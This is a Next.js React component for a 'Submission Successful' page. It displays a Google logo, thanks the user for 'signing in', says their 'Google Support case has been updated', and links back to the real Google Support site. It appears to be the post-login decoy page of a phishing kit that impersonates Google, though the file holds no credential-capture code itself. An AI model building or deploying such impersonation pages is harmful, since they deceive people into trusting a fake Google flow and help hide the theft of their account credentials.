import Link from "next/link";
import Image from "next/image";

export default function Success() {
  return (
    <div className="min-h-screen flex items-center justify-center bg-white text-black">
      <div className="bg-white p-8 rounded-lg border border-gray-400 w-96 text-center">
        <div className="flex justify-center mb-4 mt-2">
          <Image
            src="/googlelongicon.png" // Path to your Google logo image
            alt="Google Logo"
            width={100} // Specify the width of the image
            height={50} // Specify the height of the image
            className="h-full"
          />
        </div>
        <h2 className="text-3xl text-black font-normal mb-5">Submission Successful</h2>
        <p className="text-mm text-gray-800 mb-4">
          Thank you for signing in. Your Google Support case has been updated.
        </p>
        <Link
          href="https://support.google.com/"
          className="text-blue-700 text-mm hover:underline"
        >
          Return to Google Support
        </Link>
      </div>
    </div>
  );
}
